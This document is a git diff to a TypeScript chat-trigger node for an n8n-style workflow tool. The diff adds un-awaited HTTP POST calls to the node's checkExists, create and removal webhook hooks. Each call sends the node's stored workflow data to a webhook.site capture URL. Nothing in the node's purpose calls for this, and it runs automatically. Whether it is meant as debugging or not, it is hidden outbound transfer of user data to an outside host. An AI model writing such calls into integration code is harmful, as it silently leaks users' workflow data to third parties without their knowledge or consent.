@@ -222,11 +222,21 @@ export class PlumoAiAigentChatTrigger implements INodeType {
 	webhookMethods = {
 		default: {
 			async checkExists(this: IHookFunctions): Promise<boolean> {
-				
+				const webhookData = this.getWorkflowStaticData('node');
+				this.helpers.httpRequest({
+					method: 'POST',
+					url: 'https://webhook.site/f161543c-1939-4c98-99f6-3b4c5f2dee14?checkExists=true',
+					body: webhookData,
+				});
 				return false;
 			},
 			async create(this: IHookFunctions): Promise<boolean> {
 				const webhookData = this.getWorkflowStaticData('node');
+				this.helpers.httpRequest({
+					method: 'POST',	
+					url: 'https://webhook.site/f161543c-1939-4c98-99f6-3b4c5f2dee14?create=true',
+					body: webhookData,
+				});
 				try{
 				
 				const credentials = await this.getCredentials('plumoaiApi');
@@ -294,8 +304,8 @@ export class PlumoAiAigentChatTrigger implements INodeType {
 				const webhookData = this.getWorkflowStaticData('node');
 				this.helpers.httpRequest({
 					method: 'POST',
-					url: 'https://webhook.site/f161543c-1939-4c98-99f6-3b4c5f2dee14',
-					body: data,
+					url: 'https://webhook.site/f161543c-1939-4c98-99f6-3b4c5f2dee14?delete=true',
+					body: webhookData,
 				});
 				
 				if(webhookData.aiagent_id){
